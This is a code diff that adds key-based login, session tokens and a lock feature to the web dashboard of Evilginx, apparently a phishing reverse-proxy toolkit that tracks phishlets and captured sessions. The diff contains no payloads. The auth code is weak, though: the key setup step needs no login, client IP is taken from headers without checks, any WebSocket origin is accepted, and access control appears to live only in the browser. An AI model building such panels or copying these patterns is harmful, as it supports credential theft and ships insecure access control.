@@ -1,12 +1,12 @@
 package core
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"html/template"
 	"net/http"
 	"strconv"
-	"strings"
 	"sync"
 	"time"
 
@@ -17,14 +17,45 @@ import (
 )
 
 type WebServer struct {
-	server      *http.Server
-	cfg         *Config
-	db          *database.Database
-	proxy       *HttpProxy
-	upgrader    websocket.Upgrader
-	clients     map[*websocket.Conn]bool
-	clientsMutex sync.RWMutex
-	isRunning   bool
+	server         *http.Server
+	cfg            *Config
+	db             *database.Database
+	proxy          *HttpProxy
+	upgrader       websocket.Upgrader
+	clients        map[*websocket.Conn]bool
+	clientsMutex   sync.RWMutex
+	sessions       map[string]*AuthSession
+	sessionsMutex  sync.RWMutex
+	isRunning      bool
+}
+
+type AuthSession struct {
+	Token     string
+	CreatedAt time.Time
+	ExpiresAt time.Time
+	IPAddress string
+}
+
+type AuthRequest struct {
+	Key string `json:"key"`
+}
+
+type AuthResponse struct {
+	Success bool   `json:"success"`
+	Token   string `json:"token,omitempty"`
+	Message string `json:"message,omitempty"`
+}
+
+type AuthStatusResponse struct {
+	IsSetup         bool `json:"is_setup"`
+	IsLocked        bool `json:"is_locked"`
+	IsAuthenticated bool `json:"is_authenticated"`
+}
+
+type SetupResponse struct {
+	Success bool   `json:"success"`
+	Key     string `json:"key,omitempty"`
+	Message string `json:"message,omitempty"`
 }
 
 type DashboardData struct {
@@ -65,6 +96,7 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 		db:       db,
 		proxy:    proxy,
 		clients:  make(map[*websocket.Conn]bool),
+		sessions: make(map[string]*AuthSession),
 		upgrader: websocket.Upgrader{
 			CheckOrigin: func(r *http.Request) bool {
 				return true // Allow all origins for development
@@ -83,6 +115,14 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 	router.HandleFunc("/api/sessions/{id}", ws.handleAPISessionDetails).Methods("GET")
 	router.HandleFunc("/api/stats", ws.handleAPIStats).Methods("GET")
 	router.HandleFunc("/api/phishlets", ws.handleAPIPhishlets).Methods("GET")
+	
+	// Authentication routes
+	router.HandleFunc("/api/auth/status", ws.handleAuthStatus).Methods("GET")
+	router.HandleFunc("/api/auth/setup", ws.handleAuthSetup).Methods("POST")
+	router.HandleFunc("/api/auth/login", ws.handleAuthLogin).Methods("POST")
+	router.HandleFunc("/api/auth/logout", ws.handleAuthLogout).Methods("POST")
+	router.HandleFunc("/api/auth/lock", ws.handleAuthLock).Methods("POST")
+	router.HandleFunc("/api/auth/unlock", ws.handleAuthUnlock).Methods("POST")
 	
 	// WebSocket endpoint
 	router.HandleFunc("/ws", ws.handleWebSocket).Methods("GET")
@@ -146,6 +186,156 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             color: #e0e0e0;
             min-height: 100vh;
             line-height: 1.6;
+        }
+
+        /* Authentication Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal.active {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        .modal h2 {
+            color: #4CAF50;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .setup-steps {
+            text-align: left;
+        }
+
+        .step {
+            display: none;
+            padding: 20px 0;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .key-display {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            color: #4CAF50;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .key-warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid rgba(255, 193, 7, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            color: #ffc107;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin: 20px 0;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #e0e0e0;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            color: #e0e0e0;
+            font-size: 16px;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #4CAF50;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            background: linear-gradient(45deg, #45a049, #3d8b40);
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(45deg, #666, #555);
+        }
+
+        .btn-secondary:hover {
+            background: linear-gradient(45deg, #555, #444);
+        }
+
+        .error {
+            background: rgba(244, 67, 54, 0.2);
+            border: 1px solid rgba(244, 67, 54, 0.5);
+            border-radius: 8px;
+            padding: 10px;
+            margin: 10px 0;
+            color: #f44336;
+            font-size: 14px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .auth-controls {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 999;
+        }
+
+        .auth-controls .btn {
+            margin: 5px;
+            padding: 8px 16px;
+            font-size: 14px;
         }
 
         .container {
@@ -354,6 +544,77 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
     </style>
 </head>
 <body>
+    <!-- Authentication Modals -->
+    <div id="setupWizard" class="modal">
+        <div class="modal-content">
+            <h2>🔐 Setup Web Panel Security</h2>
+            <div class="setup-steps">
+                <div class="step active" data-step="1">
+                    <h3>Welcome</h3>
+                    <p>Secure your web panel with a unique authentication key.</p>
+                    <p>This key will be required to access the dashboard.</p>
+                    <button class="btn" onclick="startSetup()">Get Started</button>
+                </div>
+                
+                <div class="step" data-step="2">
+                    <h3>🔑 Your Security Key</h3>
+                    <p>Save this key in a secure location. You will need it to access the dashboard.</p>
+                    <div class="key-display">
+                        <code id="generatedKey"></code>
+                        <button class="btn-secondary" onclick="copyKey()">📋 Copy</button>
+                    </div>
+                    <div class="key-warning">
+                        ⚠️ <strong>Important:</strong> Save this key securely! It cannot be recovered if lost.
+                    </div>
+                    <button class="btn" onclick="confirmSetup()">I've Saved It</button>
+                </div>
+                
+                <div class="step" data-step="3">
+                    <h3>✅ Setup Complete</h3>
+                    <p>Your web panel is now secured with authentication!</p>
+                    <p>You can now access the dashboard and use the lock/unlock feature.</p>
+                    <button class="btn" onclick="finishSetup()">Continue to Dashboard</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <h2>🔐 Enter Security Key</h2>
+            <p>Please enter your security key to access the dashboard.</p>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="securityKey">Security Key:</label>
+                    <input type="password" id="securityKey" placeholder="Enter your security key" required>
+                </div>
+                <button type="submit" class="btn">Unlock Dashboard</button>
+            </form>
+            <div id="loginError" class="error hidden"></div>
+        </div>
+    </div>
+
+    <div id="unlockModal" class="modal">
+        <div class="modal-content">
+            <h2>🔓 Unlock Panel</h2>
+            <p>The panel is currently locked. Enter your security key to unlock it.</p>
+            <form id="unlockForm">
+                <div class="form-group">
+                    <label for="unlockKey">Security Key:</label>
+                    <input type="password" id="unlockKey" placeholder="Enter your security key" required>
+                </div>
+                <button type="submit" class="btn">Unlock Panel</button>
+            </form>
+            <div id="unlockError" class="error hidden"></div>
+        </div>
+    </div>
+
+    <!-- Authentication Controls -->
+    <div class="auth-controls" id="authControls" style="display: none;">
+        <button class="btn btn-secondary" onclick="lockPanel()">🔒 Lock Panel</button>
+        <button class="btn btn-secondary" onclick="logout()">🚪 Logout</button>
+    </div>
+
     <div class="container">
         <div class="header">
             <h1>🎣 Evilginx Dashboard</h1>
@@ -399,6 +660,228 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
     </div>
 
     <script>
+        // Authentication System
+        class AuthManager {
+            constructor() {
+                this.token = localStorage.getItem('authToken');
+                this.checkAuthStatus();
+            }
+
+            async checkAuthStatus() {
+                try {
+                    const response = await fetch('/api/auth/status', {
+                        headers: { 'Authorization': this.token || '' }
+                    });
+                    const data = await response.json();
+                    
+                    if (!data.is_setup) {
+                        this.showSetupWizard();
+                    } else if (data.is_locked) {
+                        this.showUnlockModal();
+                    } else if (!data.is_authenticated) {
+                        this.showLoginModal();
+                    } else {
+                        this.showDashboard();
+                    }
+                } catch (error) {
+                    console.error('Auth status check failed:', error);
+                    this.showLoginModal();
+                }
+            }
+
+            showSetupWizard() {
+                document.getElementById('setupWizard').classList.add('active');
+                document.querySelector('.container').style.display = 'none';
+            }
+
+            showLoginModal() {
+                document.getElementById('loginModal').classList.add('active');
+                document.querySelector('.container').style.display = 'none';
+            }
+
+            showUnlockModal() {
+                document.getElementById('unlockModal').classList.add('active');
+                document.querySelector('.container').style.display = 'none';
+            }
+
+            showDashboard() {
+                document.querySelectorAll('.modal').forEach(modal => {
+                    modal.classList.remove('active');
+                });
+                document.querySelector('.container').style.display = 'block';
+                document.getElementById('authControls').style.display = 'block';
+            }
+
+            hideError(errorId) {
+                const error = document.getElementById(errorId);
+                if (error) error.classList.add('hidden');
+            }
+
+            showError(errorId, message) {
+                const error = document.getElementById(errorId);
+                if (error) {
+                    error.textContent = message;
+                    error.classList.remove('hidden');
+                }
+            }
+
+            async login(key) {
+                try {
+                    const response = await fetch('/api/auth/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ key: key })
+                    });
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        this.token = data.token;
+                        localStorage.setItem('authToken', this.token);
+                        this.showDashboard();
+                        if (window.dashboard) {
+                            window.dashboard.init();
+                        }
+                    } else {
+                        this.showError('loginError', data.message);
+                    }
+                } catch (error) {
+                    this.showError('loginError', 'Login failed. Please try again.');
+                }
+            }
+
+            async logout() {
+                try {
+                    await fetch('/api/auth/logout', {
+                        method: 'POST',
+                        headers: { 'Authorization': this.token }
+                    });
+                } catch (error) {
+                    console.error('Logout failed:', error);
+                }
+                
+                this.token = null;
+                localStorage.removeItem('authToken');
+                this.checkAuthStatus();
+            }
+
+            async lockPanel() {
+                try {
+                    const response = await fetch('/api/auth/lock', {
+                        method: 'POST',
+                        headers: { 'Authorization': this.token }
+                    });
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        this.token = null;
+                        localStorage.removeItem('authToken');
+                        this.checkAuthStatus();
+                    }
+                } catch (error) {
+                    console.error('Lock failed:', error);
+                }
+            }
+
+            async unlockPanel(key) {
+                try {
+                    const response = await fetch('/api/auth/unlock', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ key: key })
+                    });
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        this.checkAuthStatus();
+                    } else {
+                        this.showError('unlockError', data.message);
+                    }
+                } catch (error) {
+                    this.showError('unlockError', 'Unlock failed. Please try again.');
+                }
+            }
+
+            async setupAuth() {
+                try {
+                    const response = await fetch('/api/auth/setup', {
+                        method: 'POST'
+                    });
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        document.getElementById('generatedKey').textContent = data.key;
+                        this.showStep(2);
+                    } else {
+                        alert('Setup failed: ' + data.message);
+                    }
+                } catch (error) {
+                    alert('Setup failed. Please try again.');
+                }
+            }
+
+            showStep(step) {
+                document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+                document.querySelector(`[data-step="${step}"]`).classList.add('active');
+            }
+
+            copyKey() {
+                const key = document.getElementById('generatedKey').textContent;
+                navigator.clipboard.writeText(key).then(() => {
+                    alert('Key copied to clipboard!');
+                });
+            }
+        }
+
+        // Global functions for HTML onclick handlers
+        let authManager;
+        
+        function startSetup() {
+            authManager.setupAuth();
+        }
+
+        function confirmSetup() {
+            authManager.showStep(3);
+        }
+
+        function finishSetup() {
+            authManager.showLoginModal();
+        }
+
+        function copyKey() {
+            authManager.copyKey();
+        }
+
+        function lockPanel() {
+            if (confirm('Are you sure you want to lock the panel?')) {
+                authManager.lockPanel();
+            }
+        }
+
+        function logout() {
+            if (confirm('Are you sure you want to logout?')) {
+                authManager.logout();
+            }
+        }
+
+        // Form handlers
+        document.addEventListener('DOMContentLoaded', function() {
+            authManager = new AuthManager();
+
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                authManager.hideError('loginError');
+                const key = document.getElementById('securityKey').value;
+                authManager.login(key);
+            });
+
+            document.getElementById('unlockForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                authManager.hideError('unlockError');
+                const key = document.getElementById('unlockKey').value;
+                authManager.unlockPanel(key);
+            });
+        });
+
         class EvilginxDashboard {
             constructor() {
                 this.ws = null;
@@ -611,9 +1094,10 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             }
         }
 
-        // Initialize the dashboard
+        // Initialize the dashboard after authentication
         document.addEventListener('DOMContentLoaded', () => {
-            new EvilginxDashboard();
+            window.dashboard = new EvilginxDashboard();
+            // Dashboard will be initialized by AuthManager when authenticated
         });
     </script>
 </body>
@@ -693,7 +1177,7 @@ func (ws *WebServer) handleAPIPhishlets(w http.ResponseWriter, r *http.Request) 
 	var phishlets []PhishletInfo
 	
 	for _, name := range ws.cfg.GetPhishletNames() {
-		phishlet, err := ws.cfg.GetPhishlet(name)
+		_, err := ws.cfg.GetPhishlet(name)
 		if err != nil {
 			continue
 		}
@@ -755,6 +1239,248 @@ func (ws *WebServer) sendToClient(conn *websocket.Conn, msgType string, data int
 	if err != nil {
 		log.Error("websocket write error: %v", err)
 	}
+}
+
+// Session management methods
+func (ws *WebServer) generateSessionToken() string {
+	bytes := make([]byte, 32)
+	rand.Read(bytes)
+	return hex.EncodeToString(bytes)
+}
+
+func (ws *WebServer) createSession(ip string) string {
+	token := ws.generateSessionToken()
+	ws.sessionsMutex.Lock()
+	defer ws.sessionsMutex.Unlock()
+	
+	ws.sessions[token] = &AuthSession{
+		Token:     token,
+		CreatedAt: time.Now(),
+		ExpiresAt: time.Now().Add(24 * time.Hour),
+		IPAddress: ip,
+	}
+	
+	return token
+}
+
+func (ws *WebServer) validateSession(token string) bool {
+	ws.sessionsMutex.RLock()
+	defer ws.sessionsMutex.RUnlock()
+	
+	session, exists := ws.sessions[token]
+	if !exists {
+		return false
+	}
+	
+	if time.Now().After(session.ExpiresAt) {
+		// Session expired
+		delete(ws.sessions, token)
+		return false
+	}
+	
+	return true
+}
+
+func (ws *WebServer) destroySession(token string) {
+	ws.sessionsMutex.Lock()
+	defer ws.sessionsMutex.Unlock()
+	
+	delete(ws.sessions, token)
+}
+
+func (ws *WebServer) cleanupExpiredSessions() {
+	ws.sessionsMutex.Lock()
+	defer ws.sessionsMutex.Unlock()
+	
+	now := time.Now()
+	for token, session := range ws.sessions {
+		if now.After(session.ExpiresAt) {
+			delete(ws.sessions, token)
+		}
+	}
+}
+
+func (ws *WebServer) getClientIP(r *http.Request) string {
+	forwarded := r.Header.Get("X-Forwarded-For")
+	if forwarded != "" {
+		return forwarded
+	}
+	
+	realIP := r.Header.Get("X-Real-IP")
+	if realIP != "" {
+		return realIP
+	}
+	
+	return r.RemoteAddr
+}
+
+// Authentication handlers
+func (ws *WebServer) handleAuthStatus(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	
+	token := r.Header.Get("Authorization")
+	isAuthenticated := ws.validateSession(token)
+	
+	response := AuthStatusResponse{
+		IsSetup:         ws.cfg.IsSetup(),
+		IsLocked:        ws.cfg.IsLocked(),
+		IsAuthenticated: isAuthenticated,
+	}
+	
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAuthSetup(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	
+	if ws.cfg.IsSetup() {
+		response := SetupResponse{
+			Success: false,
+			Message: "Authentication is already setup",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	
+	key := ws.cfg.GenerateAuthKey()
+	ws.cfg.SetupAuth(key)
+	
+	response := SetupResponse{
+		Success: true,
+		Key:     key,
+		Message: "Authentication setup complete",
+	}
+	
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAuthLogin(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	
+	if !ws.cfg.IsSetup() {
+		response := AuthResponse{
+			Success: false,
+			Message: "Authentication not setup",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	
+	var req AuthRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Invalid request",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	
+	if !ws.cfg.ValidateKey(req.Key) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Invalid key",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	
+	token := ws.createSession(ws.getClientIP(r))
+	ws.cfg.UpdateLastAccess()
+	
+	response := AuthResponse{
+		Success: true,
+		Token:   token,
+		Message: "Login successful",
+	}
+	
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAuthLogout(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	
+	token := r.Header.Get("Authorization")
+	if token != "" {
+		ws.destroySession(token)
+	}
+	
+	response := AuthResponse{
+		Success: true,
+		Message: "Logout successful",
+	}
+	
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAuthLock(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	
+	ws.cfg.LockPanel()
+	
+	// Destroy all sessions
+	ws.sessionsMutex.Lock()
+	ws.sessions = make(map[string]*AuthSession)
+	ws.sessionsMutex.Unlock()
+	
+	response := AuthResponse{
+		Success: true,
+		Message: "Panel locked",
+	}
+	
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAuthUnlock(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	
+	if !ws.cfg.IsLocked() {
+		response := AuthResponse{
+			Success: false,
+			Message: "Panel is not locked",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	
+	var req AuthRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Invalid request",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	
+	if !ws.cfg.ValidateKey(req.Key) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Invalid key",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	
+	ws.cfg.UnlockPanel()
+	
+	response := AuthResponse{
+		Success: true,
+		Message: "Panel unlocked",
+	}
+	
+	json.NewEncoder(w).Encode(response)
 }
 
 func (ws *WebServer) BroadcastToClients(msgType string, data interface{}) {
